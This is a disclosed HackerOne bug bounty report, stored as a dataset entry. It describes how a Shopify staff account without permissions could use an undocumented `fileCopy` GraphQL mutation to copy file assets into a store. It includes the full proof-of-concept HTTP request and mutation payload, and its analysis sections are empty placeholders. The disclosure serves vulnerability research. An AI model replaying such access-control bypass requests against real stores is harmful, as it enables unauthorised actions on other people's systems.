---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '981472'
original_report_id: '981472'
title: Undocumented `fileCopy` GraphQL API
weakness: Improper Access Control - Generic
team_handle: shopify
created_at: '2020-09-14T05:56:11.161Z'
disclosed_at: '2020-10-22T18:43:38.511Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 140
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# Undocumented `fileCopy` GraphQL API

## Metadata

- HackerOne Report ID: 981472
- Weakness: Improper Access Control - Generic
- Program: shopify
- Disclosed At: 2020-10-22T18:43:38.511Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Impact
A malicious staff account with no permissions can copy other store file assets to current store, which they have no access to.

## Details
So the story as follow 
A malicious staff member (jack_mccracken) on storeA.myshopify.com wants to upload a file on the store but could not, due to permissions restrictions. So jack_mccracken decided to find a way to bypass the restriction so he created a new store called `storeB.myshopify.com` and uploaded a file on storeB.

jack_mccracken is a skilled attacker he found an undocumented GraphQL API called `fileCopy`, he used this API to try to copy a file from his store `StorB`  to `StoreA` (where he is a staff member). 

He login into StoreA (as staff member) and send the following request:

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: a02c5039-29f0-4280-9084-cfe12703ff60
Host: storeA.myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 485

{"query":"\r\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\r\nfile{\r\n    \r\n    path\r\n}\r\n userErrors {\r\n    field\r\n    message\r\n}\r\n    }\r\n}","variables":{
                        "absoluteKey": "s/files/1/d/0864/0471/6006/6199/files/1.jpg",
                        "key": "files/1.jpg",
                        "path": "https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"
}
}
```

the variables `absoluteKey` `key` and `path`values  are the values of the file he uploaded in his store `storeB`

THE END

## Impact

A malicious staff account with no permissions can copy other store file assets to current store, which they have no access to.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
